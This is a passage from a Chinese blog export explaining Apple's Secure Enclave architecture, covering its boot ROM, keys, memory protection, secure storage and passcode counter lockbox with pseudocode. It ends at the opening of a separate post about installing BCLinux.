Enclave技术，Apple实现了智能终端、生产力设备和可穿戴设备等各个平台的统一安全解决方案，将硬件和软件的整合提升到了一个全新的高度。</p>\n<h2 id=\"三、Secure-Enclave的核心组件\"><a href=\"#三、Secure-Enclave的核心组件\" class=\"headerlink\" title=\"三、Secure Enclave的核心组件\"></a>三、Secure Enclave的核心组件</h2><p>安全隔区是一个独立于操作系统的片上系统（System on Chips），自身拥有独立的Boot ROM和AES引擎，为数据保护密钥管理提供所有加密操作，并保持数据保护的完整性（即使内核已被破坏）。<br>安全隔区还为加密静态数据所需密钥的安全生成和储存提供了基础，通过特殊通道向 AES 引擎提供所需的密钥材料，而不将此信息透露给应用程序处理器 (或 CPU) 或者整个操作系统。<br>一般认为，Secure Enclave就是一个高度定制版的 ARM TrustZone，也就是“安全世界”的物理实现。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/soc.png\" alt=\"SOC\"></p>\n<h3 id=\"1、安全隔区处理器（Secure-Enclage-Processor，SEP）\"><a href=\"#1、安全隔区处理器（Secure-Enclage-Processor，SEP）\" class=\"headerlink\" title=\"1、安全隔区处理器（Secure Enclage Processor，SEP）\"></a>1、安全隔区处理器（Secure Enclage Processor，SEP）</h3><ul>\n<li>安全隔区处理器为安全隔区提供专用计算能力</li>\n<li>运行Apple定制的L4微内核（也称为sepOS），包含了Apple的签名证书</li>\n</ul>\n<h3 id=\"2、内存保护引擎（Memory-Protection-Engine）\"><a href=\"#2、内存保护引擎（Memory-Protection-Engine）\" class=\"headerlink\" title=\"2、内存保护引擎（Memory Protection Engine）\"></a>2、内存保护引擎（Memory Protection Engine）</h3><ul>\n<li>安全隔区使用宿主设备的内存硬件资源，但规划了专用区域，通过多层保护将由安全隔区保护的内存与应用程序处理器隔离</li>\n<li>当设备启动时，安全隔区 Boot ROM 将生成一组随机临时密钥，用于内存保护引擎的加密处理和认证处理，并支持安全隔区内存的重放保护</li>\n<li>内存保护引擎以内联方式运行且对安全隔区透明，即：安全隔区将内存当作普通的未加密内存一样进行读取和写入，而安全隔区外的观察程序只能看到加密和认证版本的内存</li>\n<li>在 A14 和 M1 之后增加了第二组密钥，用于与安全神经网络引擎共享的数据</li>\n</ul>\n<h3 id=\"3、真随机数生成器（True-Random-Number-Generator，TRNG）\"><a href=\"#3、真随机数生成器（True-Random-Number-Generator，TRNG）\" class=\"headerlink\" title=\"3、真随机数生成器（True Random Number Generator，TRNG）\"></a>3、真随机数生成器（True Random Number Generator，TRNG）</h3><ul>\n<li>用于生成安全的随机数，每次生成随机加密密钥、随机密钥种子或其他熵源时都会使用TRNG</li>\n<li>基于多个并联环形振荡器的异或计算产生真随机数，再通过CTR_DRBG后处理算法提供安全的随机数</li>\n</ul>\n<h3 id=\"4、安全隔区AES引擎（Secure-Enclage-AES-Engine）\"><a href=\"#4、安全隔区AES引擎（Secure-Enclage-AES-Engine）\" class=\"headerlink\" title=\"4、安全隔区AES引擎（Secure Enclage AES Engine）\"></a>4、安全隔区AES引擎（Secure Enclage AES Engine）</h3><ul>\n<li>安全隔区AES引擎是一个硬件块，用于基于 AES 密码来执行对称加密</li>\n<li>AES 引擎设计用于防范通过时序和静态功耗分析 (SPA) 泄露信息，还包括动态功耗分析 (DPA) 对策</li>\n<li>AES引擎支持软件密钥和硬件密钥，其内部保存了基于UID派生的硬件密钥，虽然sepOS可以请求通过硬件密钥进行加密和解密操作，但不能提取密匙</li>\n</ul>\n<h3 id=\"5、公钥加速器（Public-Key-Accelerator，PKA）\"><a href=\"#5、公钥加速器（Public-Key-Accelerator，PKA）\" class=\"headerlink\" title=\"5、公钥加速器（Public Key Accelerator，PKA）\"></a>5、公钥加速器（Public Key Accelerator，PKA）</h3><ul>\n<li>公钥加速器 (PKA) 是一个用于执行非对称加密操作的硬件块，支持 RSA 和 ECC (椭圆曲线加密) 签名和加密算法</li>\n<li>PKA 设计用于防范使用时序攻击及静态功耗分析（SPA）和动态功耗分析（DPA）等旁路攻击来泄露信息。</li>\n<li>PKA 支持软件密钥和硬件密钥，其内部保存了基于UID派生的硬件密钥，即使对sepOS软件也不可见</li>\n<li>在Apple A10之后，PKA还支持操作系统绑定密钥，也称为密封密钥保护 (SKP)，其基于安全隔区Boot ROM的哈希值 + 设备UID的组合生成，由安全隔区启动监视器负责在请求特定 Apple 服务时验证 sepOS 版本，目的是在系统发生重大版本更改时，防止未授权用户的访问</li>\n</ul>\n<h2 id=\"四、Secure-Enclave的附加组件\"><a href=\"#四、Secure-Enclave的附加组件\" class=\"headerlink\" title=\"四、Secure Enclave的附加组件\"></a>四、Secure Enclave的附加组件</h2><p>上述5个核心组件均属于计算资源范畴，与 ARM TrustZone 通用架构基本一致，但Apple安全隔区还有一些特殊类型的组件。</p>\n<h3 id=\"1-安全隔区启动代码（Secure-Enclave-Boot-ROM）\"><a href=\"#1-安全隔区启动代码（Secure-Enclave-Boot-ROM）\" class=\"headerlink\" title=\"1. 安全隔区启动代码（Secure Enclave Boot ROM）\"></a>1. 安全隔区启动代码（Secure Enclave Boot ROM）</h3><p>Apple 安全启动的设计目的是：仅允许来自 Apple 的受信任操作系统软件在启动时加载，并确保可保护软件的最底层不被篡改。<br>Boot ROM 是处理器在首次启动时所执行的第一个代码，一般固化在硬件中作为处理器不可分割的一部分，即使Apple也无法修改。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/bootrom.png\" alt=\"boot rom\"></p>\n<p>与主CPU的 Boot ROM 类似，安全隔区也包括一个专用的安全隔区 Boot ROM，是一段不可更改的代码，作为安全隔区的硬件信任根。<br>安全隔区启动的基本步骤包括：</p>\n<ol>\n<li>系统启动时，iBoot 会给安全隔区分配一个专用的内存区域；</li>\n<li>安全隔区 Boot ROM 作为安全隔区的硬件信任根，其首先初始化内存保护引擎，为由安全隔区保护的内存提供加密保护;</li>\n<li>应用程序处理器将 sepOS 镜像发送给安全隔区 Boot ROM，并拷贝到由安全隔区保护的内存；</li>\n<li>安全隔区 Boot ROM 检查 sepOS 映像的加密哈希值和签名，如果已正确签名以在设备上运行，将控制转移给 sepOS；否则，阻止进一步使用安全隔区直到下一次芯片被还原。</li>\n<li>在 A10 之后，安全隔区 Boot ROM 还将 sepOS 的哈希值锁定到专用寄存器，以便公钥加速器PKA用于操作系统绑定功能。</li>\n</ol>\n<h3 id=\"2-安全隔区启动监视器（Secure-Enclave-Boot-Monitor）\"><a href=\"#2-安全隔区启动监视器（Secure-Enclave-Boot-Monitor）\" class=\"headerlink\" title=\"2. 安全隔区启动监视器（Secure Enclave Boot Monitor）\"></a>2. 安全隔区启动监视器（Secure Enclave Boot Monitor）</h3><ul>\n<li>在 A13 之后，安全隔区还包括一个启动监视器，目标是阻止安全隔区处理器执行安全隔区 Boot ROM 以外的任何其他代码，以确保所启动 sepOS 的的完整性</li>\n<li>启动监视器依赖安全隔区处理器的系统协处理器完整性保护 (SCIP) 配置实现保护功能</li>\n<li>安全隔区 Boot ROM 启动时，通过检测 SepOS 镜像的哈希值以确保合法授权，而启动监视器负责确定并监控 sepOS 加载后的运行哈希值，以确保运行过程中代码不被外部篡改</li>\n</ul>\n<h3 id=\"3-根加密密钥（Root-Cryptographic-Keys）\"><a href=\"#3-根加密密钥（Root-Cryptographic-Keys）\" class=\"headerlink\" title=\"3. 根加密密钥（Root Cryptographic Keys）\"></a>3. 根加密密钥（Root Cryptographic Keys）</h3><ul>\n<li>安全隔区包括一个唯一 ID (UID) 根加密密钥。UID 对于每台设备来说都是唯一的，且与设备上的任何其他标 识符都无关</li>\n<li>UID 是在制造过程中由安全隔区 TRNG 生成的随机数，并使用完全在安全隔区中运行的软件进程写入到<strong>熔丝</strong>中，Apple 或其任何供应商均无法访问或储存</li>\n<li>sepOS 使用 UID 作为加密因子生成各类密钥，从而将数据与特定设备捆绑起来。 例如，由于文件系统密钥层级中包括 UID， 因此如果将内置SSD储存设备从一台设备整个移至另一台设备，文件将不可访问，但通过USB连接的外部存储设备由于没有连接到AES 引擎，所以无法实现迁移保护；触控 ID 或面容 ID 数据的密钥也在受保护的范围内</li>\n<li>安全隔区还有设备组 ID (GID)，它是使用特定 SoC 的所有设备共用的 ID (例如，所有使用 Apple A14 SoC 的设备共用同一个 GID)</li>\n<li>UID 和 GID 不可以通过联合测试行动小组 (JTAG) 或其他调试接口使用</li>\n</ul>\n<blockquote>\n<p>熔丝，一般称为E-Fuse或OTP Fuse，本质就是内嵌的一块One Time Programmable Memory, 仅可被烧写一次，但可以被多次读取。</p>\n</blockquote>\n<h3 id=\"4、安全非易失性存储（Secure-Nonvolatile-Storage）\"><a href=\"#4、安全非易失性存储（Secure-Nonvolatile-Storage）\" class=\"headerlink\" title=\"4、安全非易失性存储（Secure Nonvolatile Storage）\"></a>4、安全非易失性存储（Secure Nonvolatile Storage）</h3><ul>\n<li>安全隔区配备了<strong>专用</strong>的安全非易失性存储器设备（区别于应用处理器的 NAND 存储设备），通过专用的 I2C 总线与安全隔区连接，确保物理层面仅可被安全隔区访问</li>\n<li>早期使用 EEPROM 作为数据存储资源，从 A12、S4 开始采用了第一代安全存储组件，它与安全隔区之间使用加密且认证的通信协议，确保对数据资源的独有访问权限</li>\n<li>2020年10月，发布了第二代安全组件，主要特性是新增了计数器加密箱，用于保护简单而易受攻击的用户密码passcode</li>\n<li>安全储存组件设计用于以下关键业务场景的数据保护，包括：不可更改的 ROM 代码、硬件随机数生成器、每个设备唯一的加密密钥、加密引擎和物理篡改检测等</li>\n</ul>\n<blockquote>\n<p>虽然Apple官方文档没有描述，但本人认为，安全存储组件可能存储的数据包括：</p>\n<ul>\n<li>生成密钥：通过UID、passcode和随机数等加密因子生成的各类密钥，需要持久化保存在安全载体之中</li>\n<li>生物特征：指纹识别和人脸识别的特征数据必须且只能保存在本机设备的安全载体之中</li>\n<li>各类计数器：保存状态数据，阻断重放攻击等反复尝试</li>\n</ul>\n</blockquote>\n<h3 id=\"5-AES引擎（AES-Engine）\"><a href=\"#5-AES引擎（AES-Engine）\" class=\"headerlink\" title=\"5. AES引擎（AES Engine）\"></a>5. AES引擎（AES Engine）</h3><ul>\n<li>在安全隔区 AES 引擎之外，还有一个位于安全隔区边界外的 AES256 加密引擎，专门用于处理安全隔区和NAND (非易失性) 闪存之间的加密数据传输</li>\n<li>在 A9 之后，闪存子系统位于隔离的总线上，该总线被授权只能通过 DMA 加密引擎访问包含用户数据的内存，因此必须为安全隔区设置该专用 AES 加密引擎</li>\n<li>启动时，sepOS 会使用 TRNG 生成一个临时封装密钥，安全隔区使用<strong>专用线路</strong>将此密钥传输到 AES 引擎，旨在防止它被安全隔区外的任何软件访问；随后， sepOS 使用临时封装密钥来封装文件密钥，供应用程序处理器文件系统驱动程序使用，当文件系统驱动程序读取或写入文件时，它会将封装的密钥发送到 AES 引擎 以解封密钥。 AES 引擎绝不会将未封装的密钥透露给软件。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/aes-engine.png\" alt=\"AES-Engine\"></li>\n</ul>\n<h3 id=\"6-神经网络引擎（Secure-Neural-Engine）\"><a href=\"#6-神经网络引擎（Secure-Neural-Engine）\" class=\"headerlink\" title=\"6. 神经网络引擎（Secure Neural Engine）\"></a>6. 神经网络引擎（Secure Neural Engine）</h3><ul>\n<li>在配备 Face ID 的设备上，安全神经网络引擎将 2D 图像和深度图转化为用户脸部的数学表达式（不是原始图像，仅包含特征值）</li>\n<li>从 A11 开始，安全神经网络引擎已集成到安全隔区中。安全神经网络引擎采用直接内存访问 (DMA) 以实现高性能。由 sepOS 内核控制的输入输出内存管理单元 (IOMMU) 将此直接访问的范围限制在经授权的内存区域。</li>\n<li>从 A14 和 M1 开始，安全神经网络引擎在应用程序处理器的神经网络引擎中作为安全模式实现。 一个专用的硬件安全性控制器会在应用程序处理器和安全隔区的任务间切换，每次转换时神经网络引擎状态均会被重设以保持面容 ID 数据的安全。 一个专用的引擎会应用内存加密、 认证和访问控制。 同时，它使用单独的加密密钥和内存范围，以将安全神经网络引擎限制在经授权的内存区域。</li>\n</ul>\n<blockquote>\n<p>也就是说，安全神经网络引擎改为虚拟化方案，不再是独立的协处理器哦</p>\n</blockquote>\n<h3 id=\"7-功耗和时钟监视器（Power-and-clock-monitors）\"><a href=\"#7-功耗和时钟监视器（Power-and-clock-monitors）\" class=\"headerlink\" title=\"7. 功耗和时钟监视器（Power and clock monitors）\"></a>7. 功耗和时钟监视器（Power and clock monitors）</h3><ul>\n<li>所有的电子设备都被设计为在一定的电压和频率包络内运行。如果在此包络外运行，电子设备可能会发生故障，然后安全性控制就可能被绕过</li>\n<li>为了帮助确保电压和频率保持在安全的范围内，安全隔区中设计了监视电路</li>\n<li>这些监视电路被设计为具有比安全隔区其余部分更大的运行包络。如果监视器检测到非法运行点，安全隔区中的时钟会自动停止，在下一次 SoC 重设前不会重新开始运行。</li>\n</ul>\n<h2 id=\"五、几个问题的讨论\"><a href=\"#五、几个问题的讨论\" class=\"headerlink\" title=\"五、几个问题的讨论\"></a>五、几个问题的讨论</h2><h3 id=\"1-Apple-Secure-Enclave-的技术实现是虚拟化方案，还是协处理器方案？\"><a href=\"#1-Apple-Secure-Enclave-的技术实现是虚拟化方案，还是协处理器方案？\" class=\"headerlink\" title=\"1. Apple Secure Enclave 的技术实现是虚拟化方案，还是协处理器方案？\"></a>1. Apple Secure Enclave 的技术实现是虚拟化方案，还是协处理器方案？</h3><p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/apple-M1.png\" alt=\"M1\"></p>\n<p>由于Mac电脑原来采用Intel芯片，因此Apple发展了T系列安全芯片解决安全问题，显然这是一个独立芯片的方案，而随着Apple自研的M系列CPU的出现，安全隔区已经被整合到CPU芯片之中。<br>而从iPhone手机的角度看，A系列CPU都是基于ARM指令集，虚拟化方案和协处理器方案都可以满足TrustZone架构的技术要求，从外部功能提供上无法区别，主要差别就是设计复杂度和成本问题。</p>\n<p>从Apple提供的安全性文档中的描述推测，Secure Enclave 采用了协处理器方案，请看关于SCIP的描述。</p>\n<blockquote>\n<p>Coprocessor firmware handles many critical system tasks—for example, the Secure Enclave, the image sensor processor, and the motion coprocessor. Therefore its security is a key part of the security of the overall system. To prevent modification of coprocessor firmware, Apple uses a mechanism called System Coprocessor Integrity Protection (SCIP).</p>\n</blockquote>\n<p>但是也有例外，安全神经网络引擎原本是安全隔区的一个组件，但从 A14 开始，调整为应用处理器中神经网络引擎的安全模式，也就是虚拟化方案。考虑到神经网络引擎的专用性，这应该是更有效率的选择。</p>\n<blockquote>\n<p>Starting with A14 and the M1 family, the Secure Neural Engine is implemented as a secure mode in the Application Processor’s Neural Engine. A dedicated hardware security controller switches between Application Processor and Secure Enclave tasks, resetting Neural Engine state on each transition to keep Face ID data secure. A dedicated engine applies memory encryption, authentication, and access control. At the same time, it uses a separate cryptographic key and memory range to limit the Secure Neural Engine to authorized memory regions.</p>\n</blockquote>\n<h3 id=\"2-如何确保-Secure-Enclave-外部接口的安全性？\"><a href=\"#2-如何确保-Secure-Enclave-外部接口的安全性？\" class=\"headerlink\" title=\"2. 如何确保 Secure Enclave 外部接口的安全性？\"></a>2. 如何确保 Secure Enclave 外部接口的安全性？</h3><p>Secure Enclave 虽然是安全世界，但要正常工作就必须与外部世界发生数据交换，因此外部接口的边界安全防护是重点，必须全面、可靠。</p>\n<ul>\n<li>RAM：共享，使用主处理器的内存硬件资源，但通过安全内存保护引擎实现加密和认证</li>\n<li>ROM：专用，安全隔区有自己的Boot ROM，并完全固化在内部</li>\n<li>NAND（闪存）：可访问，安全隔区可以访问系统NAND资源，但通过专用AES引擎实现加密保护</li>\n<li>安全非易失性存储：专用，存储各类密钥、熵源、计数器和指纹特征等用户敏感数据，通过专用I2C总线连接</li>\n<li>UID &amp; GID：制造过程中通过E-Fuse固化</li>\n</ul>\n<h3 id=\"3-Apple设备中Secure-Equipment和Secure-Enclave的关系是什么？\"><a href=\"#3-Apple设备中Secure-Equipment和Secure-Enclave的关系是什么？\" class=\"headerlink\" title=\"3. Apple设备中Secure Equipment和Secure Enclave的关系是什么？\"></a>3. Apple设备中Secure Equipment和Secure Enclave的关系是什么？</h3><p>以Apple Pay的支付授权为例，</p>\n<p>安全元件是运行 Java Card 平台的认证芯片，符合金融行业对电子支付的要求，由 EMVCo 提供安全认证。</p>\n<blockquote>\n<p>The Secure Element is an industry-standard, certified chip running the Java Card platform, which is compliant with financial industry requirements for electronic payments. The Secure Element IC and the Java Card platform are certified in accordance with the EMVCo Security Evaluation process. After the successful completion of the security evaluation, EMVCo issues unique IC and platform certificates.</p>\n</blockquote>\n<p>安全元件负责管理支付网络或发卡机构认证的Applet，业务密钥储存在Applet内，由SE的安全域提供保护。</p>\n<blockquote>\n<p>The Secure Element hosts a specially designed applet to manage Apple Pay. It also includes applets certified by payment networks or card issuers. Credit, debit, or prepaid card data is sent from the payment network or card issuer encrypted to these applets using keys that are known only to the payment network or card issuer and the applets’ security domain. This data is stored within these applets and protected using the Secure Element’s security features. During a transaction, the terminal communicates directly with the Secure Element through the near-field-communication (NFC) controller over a dedicated hardware bus.</p>\n</blockquote>\n<p>安全隔区负责为Apple Pay的支付业务提供用户层面（基于Face ID、TouchID 和 Passcode等）的授权，而不涉及金融机构的鉴权或风险控制。<br>在添加或移除 Apple Pay 卡片时，安全隔区的介入也是这一逻辑的体现。</p>\n<blockquote>\n<p>On iPhone, iPad, Apple Watch, Mac computers with Touch ID, and Mac computers with Apple silicon that use the Magic Keyboard with Touch ID, the Secure Enclave manages the authentication process and allows a payment transaction to proceed.</p>\n</blockquote>\n<hr>\n<h2 id=\"附录一：Apple自研芯片的安全隔区特性\"><a href=\"#附录一：Apple自研芯片的安全隔区特性\" class=\"headerlink\" title=\"附录一：Apple自研芯片的安全隔区特性\"></a>附录一：Apple自研芯片的安全隔区特性</h2><p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/list.png\" alt=\"List\"></p>\n<h2 id=\"附录二：安全隔区的演进\"><a href=\"#附录二：安全隔区的演进\" class=\"headerlink\" title=\"附录二：安全隔区的演进\"></a>附录二：安全隔区的演进</h2><p>2018年，安全隔区的技术架构是这样的！</p>\n<p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/soc-old.jpg\" alt=\"安全隔区的老框架\"></p>\n<h2 id=\"附录三：Apple自研芯片的分类\"><a href=\"#附录三：Apple自研芯片的分类\" class=\"headerlink\" title=\"附录三：Apple自研芯片的分类\"></a>附录三：Apple自研芯片的分类</h2><h3 id=\"1、主处理器芯片\"><a href=\"#1、主处理器芯片\" class=\"headerlink\" title=\"1、主处理器芯片\"></a>1、主处理器芯片</h3><ul>\n<li>A系列：智能终端的iOS，使用于iPhone、iPad、iPod touch、Apple TV及Studio Display产品线。从A4开始，最新型号是 iPhone 13 搭载的 A15</li>\n<li>S系列：可穿戴设备的Watch OS，使用于Apple Watch和HomePod Mini产品线，最新型号是S7</li>\n<li>M系列：生产力工具的Mac OS，使用于Mac OS的笔记本电脑和台式机，基于ARM架构的自研处理器，包括M1、M2等</li>\n</ul>\n<h3 id=\"2、功能芯片\"><a href=\"#2、功能芯片\" class=\"headerlink\" title=\"2、功能芯片\"></a>2、功能芯片</h3><ul>\n<li>H（W）系列：音频芯片，用于Airpods耳机，2016首发W1芯片，后续还有W2、W3；AirPods第二代之后被更名为H系列</li>\n<li>U系列：定位芯片，用于UWB（ultra-wide band）精确定位的芯片，替代已被放弃的基于低功耗蓝牙BLE的iBeacons技术，2019年首次出现在iPhone 11，AirTag标签也使用U1</li>\n<li>T系列：已下线。用于基于Intel芯片的Mac电脑的安全芯片，包括T1和T2，该系列已停止并整合进M系列</li>\n</ul>\n<h2 id=\"附录四：第二代安全存储组件的计数器加密箱的工作原理（ToDO）\"><a href=\"#附录四：第二代安全存储组件的计数器加密箱的工作原理（ToDO）\" class=\"headerlink\" title=\"附录四：第二代安全存储组件的计数器加密箱的工作原理（ToDO）\"></a>附录四：第二代安全存储组件的计数器加密箱的工作原理（ToDO）</h2><p>2020年10月，苹果突然发布了第二代安全存储组件，并紧急升级 A12、A13 以及 S5 芯片，据认为 GrayKey 密码破解设备有关系，其采用暴力破解方式实现iPhone解锁。</p>\n<p>第二代安全储存组件增加了计数器加密箱，包括：1个128位盐，1个128位密码验证器，1个8位计数器，1个 8 位最大尝试值，其工作原理如下：</p>\n<h3 id=\"1-创建阶段\"><a href=\"#1-创建阶段\" class=\"headerlink\" title=\"1. 创建阶段\"></a>1. 创建阶段</h3><ul>\n<li><p>安全隔区：<br>  发送数据：密码熵值（passcodeEntropyValue），最大重试次数（maxRetryTimes）<br>  接受数据：密码箱熵值（lockboxEntropyValue）</p>\n</li>\n<li><p>安全存储组件：<br>  自有数据：安全存储组件的唯一加密密钥（SSCKey）<br>  处理流程伪代码：</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">saltValue = <span class=\"title function_\">random</span>(); <span class=\"comment\">// 使用随机数生成器生成盐值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 利用提供的密码熵值、安全存储组件的唯一加密密钥和盐值中导出密码验证器值和密码箱熵值</span></span><br><span class=\"line\">(passcodeVerifierValue, lockboxEntropyValue) = <span class=\"title function_\">func</span>(passcodeEntropyValue, <span class=\"title class_\">SSCKey</span>, saltValue)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 初始化计数器密码箱</span></span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> = <span class=\"number\">0</span>；</span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">maxRetryTimes</span> = maxRetryTimes; </span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">passcodeVerifierValue</span> = passcodeVerifierValue;  <span class=\"comment\">// 保存密码验证器值</span></span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">saltValue</span> = saltValue;                          <span class=\"comment\">// 保存盐值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> lockboxEntropyValue； <span class=\"comment\">// 向安全隔区返回密码箱熵值</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-验证阶段\"><a href=\"#2-验证阶段\" class=\"headerlink\" title=\"2. 验证阶段\"></a>2. 验证阶段</h3><ul>\n<li><p>安全隔区：<br>  发送数据：密码熵值（passcodeEntropyValue）<br>  接受数据：密码箱熵值（lockboxEntropyValue）</p>\n</li>\n<li><p>安全存储组件：<br>  自有数据：安全存储组件的唯一加密密钥（SSCKey），密码箱(SSC)<br>  处理流程伪代码：</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span>++; <span class=\"comment\">// 首先增加密码箱的计数器</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> &gt; <span class=\"variable constant_\">SSC</span>.<span class=\"property\">maxRetryTimes</span> &#123;  <span class=\"comment\">// 检查递增的计数器是否超过最大尝试值</span></span><br><span class=\"line\">    <span class=\"title function_\">reset</span>(<span class=\"variable constant_\">SSC</span>);</span><br><span class=\"line\">    exit -<span class=\"number\">1</span> ; <span class=\"comment\">// 疑似重复攻击，完全清除计数器密码箱并异常退出</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 尝试使用用于创建计数器密码箱的相同算法导出密码验证器值和密码箱熵值</span></span><br><span class=\"line\">    (passcodeVerifierValue, lockboxEntropyValue) = <span class=\"title function_\">func</span>(passcodeEntropyValue, <span class=\"title class_\">SSCKey</span>, <span class=\"variable constant_\">SSC</span>.<span class=\"property\">saltValue</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> passcodeVerifierValu == <span class=\"variable constant_\">SSC</span>.<span class=\"property\">passcodeVerifierValue</span> &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> = <span class=\"number\">0</span>;               </span><br><span class=\"line\">        <span class=\"keyword\">return</span> lockboxEntropyValue; <span class=\"comment\">// 向安全隔区返回密码箱熵值并重置计数器</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;               <span class=\"comment\">// 校验不成功，返回错误</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>值得关注的是：</p>\n<ol>\n<li>加密过程使用了3个因子，<code>passcodeEntropyValue</code>由安全隔区提供，2个内部因子<code>SSCKey</code>和<code>saltValue</code>只在内部保存，因此传输是安全的</li>\n<li>安全存储组件持久化存储的不是<code>passcodeEntropyValue</code>的原始值，而是不可逆的校验值<code>passcodeVerifierValue</code>，可以防止反向获得加密因子</li>\n<li>安全存储组件的唯一加密密钥<code>SSCKey</code>是个什么东西？估计是<code>UID</code>派生出来的一个专用密钥，在安全存储组件内部全局有效</li>\n<li>向安全隔区返回密码箱熵值（而非简单的是否），具备了双向认证的基础，但是否如此没有证据！</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"apple-platform-security-guide.pdf\">Apple平台安全白皮书 - 2022英文版</a></li>\n<li><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">Apple平台安全白皮书 - 2021中文版</a></li>\n<li><a href=\"iOS%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2018%E8%8B%B1%E6%96%87%E7%89%88.pdf\">iOS安全白皮书 - 2018英文版</a></li>\n<li><a href=\"Apple-Secure-Key-Store-Cryptographic-Module.pdf\">Apple安全密钥存储加密模块 - 2018英文版</a></li>\n</ul>\n<h3 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h3><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/441603311\">苹果iOS系统安全调研</a></li>\n<li><a href=\"https://github.com/YuZhang/Security-Courseware/blob/master/system-security/ios-security.md\">iOS安全体系结构的简要分析</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-260399.htm\">基于 ARM TrustZone 的 Secure Boot 实现</a></li>\n<li><a href=\"https://www.synopsys.com/zh-cn/china/resources/dwtb/dwtb-cn-q1-21018-rootsoftrusts.html\">了解硬件信任根 - 新思公司</a></li>\n<li><a href=\"https://www.beanpodtech.com/%E5%85%B3%E4%BA%8Eapple-pay%E5%8D%81%E4%BA%94%E4%B8%AA%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/\">关于Apple Pay十五个技术问题</a></li>\n<li><a href=\"https://picture.iczhiku.com/weixin/message1610684573974.html\">MCU 芯片加密历程</a></li>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-4-secure-random-generators/\">写给开发人员的实用密码学（四）—— 安全随机数生成器 CSPRNG</a></li>\n</ul>\n<h3 id=\"安全漏洞\"><a href=\"#安全漏洞\" class=\"headerlink\" title=\"安全漏洞\"></a>安全漏洞</h3><ul>\n<li><a href=\"https://mrmad.com.tw/secure-enclave-security-chip-explodes-hardware-vulnerabilities\">蘋果Secure Enclave安全晶片爆硬體漏洞，舊款設備無法修復</a></li>\n<li><a href=\"https://www.bilibili.com/read/cv9849473/\">iPhone史诗级DFU漏洞分析</a></li>\n<li><a href=\"https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/\">Checkm8 漏洞研究</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/84925896\">苹果超级大漏洞 BootROM 的说明及威胁评估</a></li>\n</ul>\n"},{"title":"BCLinux oe21.10 安装记录","url":"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>移动云的软件源站点是：<a href=\"https://mirrors.cmecloud.cn/\">https://mirrors.cmecloud.cn</a>，提供了一些基础的软件，包括BCLinux。<br>BCLinux的镜像地址为：<a href=\"https://mirrors.cmecloud.cn/bclinux/\">https://mirrors.cmecloud.cn/bclinux/</a></p>\n<blockquote>\n<p><code>mirrors.bclinux.org</code>是同源域名，yum repolist 内部是这个域名</p>\n</blockquote>\n<h3 id=\"1-版本规划\"><a 